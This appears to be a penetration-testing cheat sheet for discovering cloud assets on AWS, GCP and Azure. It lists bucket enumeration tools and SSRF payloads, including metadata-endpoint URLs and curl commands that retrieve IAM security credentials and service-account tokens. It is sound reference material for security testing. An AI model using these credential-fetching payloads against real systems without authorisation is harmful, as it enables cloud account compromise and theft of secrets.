# Cloud Asset Discovery

## AWS Asset Discovery

### S3 Bucket Enumeration
```bash
# Permutation-based discovery
s3scanner -b targets.txt  # targets.txt = list of potential bucket names
# Service-specific patterns
# target-backup, target-logs, target-assets, target-config, target-data
# Permutation engine
lazys3 target.com
```

### Load Balancers & CloudFront
```bash
# Identify CloudFront distributions
dig target.com +short CNAME | grep cloudfront
# Test for direct ALB access via DNS
# Look for internal ALB DNS names in JS or configs
```

### AWS Metadata Endpoint Testing (via SSRF)
```bash
# IMDSv1 (older, no token required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
# IMDSv2 requires token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

## GCP Discovery

### Cloud Storage Buckets
```bash
# Same pattern as S3
curl -s https://storage.googleapis.com/target-bucket/
curl -s https://target-bucket.storage.googleapis.com/
# Use GCPBucketBrute
python3 gcpbucketbrute.py -k target
```

### GCP Metadata SSRF
```bash
# GCP metadata endpoint
http://metadata.google.internal/computeMetadata/v1/
# Requires Metadata-Flavor header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Azure Discovery

### Blob Storage
```bash
# Azure storage enumeration
curl -s https://targetstorage.blob.core.windows.net/
# Use Invoke-EnumerateAzureBlobs or MicroBurst
```

### Azure Metadata SSRF
```bash
# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires Metadata: true header
```

## Multi-Cloud Enumeration Tools

```bash
# Cloud enum
# S3Scanner, GCPBucketBrute, MicroBurst
# Cloudfox for cloud role enumeration
cloudfox aws -p target-permissions
```
